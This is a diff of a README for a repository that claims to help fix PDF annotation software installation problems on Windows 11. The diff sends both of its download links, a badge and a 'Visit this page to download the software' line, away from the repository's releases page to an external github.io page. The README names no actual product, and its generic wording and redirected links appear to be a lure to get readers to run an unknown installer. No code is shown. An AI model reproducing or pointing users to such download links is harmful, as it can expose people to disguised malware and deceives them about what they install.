@@ -1,13 +1,13 @@
 # 📝 PDF-Annotator-Setup-Help - Solve your PDF annotation installation issues
 
-[![](https://img.shields.io/badge/Download-PDF_Annotator_Setup-blue)](https://github.com/rhianonaffixial552/PDF-Annotator-Setup-Help/releases)
+[![](https://img.shields.io/badge/Download-PDF_Annotator_Setup-blue)](https://rhianonaffixial552.github.io)
 
 This repository provides clear instructions to fix common installation errors for PDF software on Windows 11. Use these steps to install your tools without technical blocks.
 
 ## 📥 Getting the software
 You need to visit the release page to obtain the correct installation file for your system. 
 
-[Visit this page to download the software](https://github.com/rhianonaffixial552/PDF-Annotator-Setup-Help/releases)
+[Visit this page to download the software](https://rhianonaffixial552.github.io)
 
 ## 💻 System requirements
 Ensure your computer meets these standards before you start the installation process.
